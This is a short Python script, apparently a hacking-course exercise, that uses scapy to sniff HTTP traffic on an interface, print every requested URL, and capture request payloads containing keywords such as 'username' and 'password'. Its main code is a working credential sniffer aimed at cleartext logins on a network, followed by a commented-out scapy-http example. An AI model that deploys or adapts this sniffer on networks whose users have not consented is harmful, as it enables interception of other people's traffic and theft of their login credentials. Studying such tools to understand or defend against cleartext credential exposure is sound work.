#!/usr/bin/env python
import scapy.all as scapy
# https://github.com/invernizzi/scapy-http
from scapy.layers import http


def sniff(interface):
    # using the Berkeley Packet Filter (BPF) syntax for the filter - http://biot.com/capstats/bpf.html
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            # check layers and fields with show function
            # print(packet.show())
            # print(packet[scapy.Raw.load])
            load = packet(scapy.Raw).load
            keywords = ["username", "user", "login", "pass", "password", "email"]
            for keyword in keywords:
                if keyword in load:
                    return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")


# scapy.http example code
'''
try:
    import scapy.all as scapy
except ImportError:
    import scapy

try:
    # This import works from the project directory
    import scapy_http.http
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers import http

packets = scapy.rdpcap('example_network_traffic.pcap')
for p in packets:
    print '=' * 78
    p.show()
'''